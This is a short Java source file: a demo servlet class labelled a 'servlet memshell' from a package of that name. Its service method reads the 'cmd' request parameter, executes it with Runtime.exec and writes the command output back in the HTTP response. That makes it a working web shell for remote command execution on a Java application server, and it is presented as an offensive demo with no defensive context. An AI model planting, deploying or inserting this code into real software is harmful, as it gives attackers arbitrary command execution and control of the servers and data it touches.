package cc.saferoad.servlet.servletmemshell;/*
@auther S0cke3t
@date 2021-12-29
*/

import javax.servlet.*;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;

public class ServletShellDemo implements Servlet {
    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        servletResponse.getWriter().println("this is a servlet memshell");
        String command = servletRequest.getParameter("cmd");
        if (command != null && !command.isEmpty()) {
            PrintWriter out = servletResponse.getWriter();
            Process process = Runtime.getRuntime().exec(command);
            InputStream in = process.getInputStream();
            int a = 0;
            byte[] b = new byte[1024];
            while ((a = in.read(b)) != -1) {
                out.println(new String(b, 0, a));
            }
            in.close();
            out.flush();
            out.close();
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}
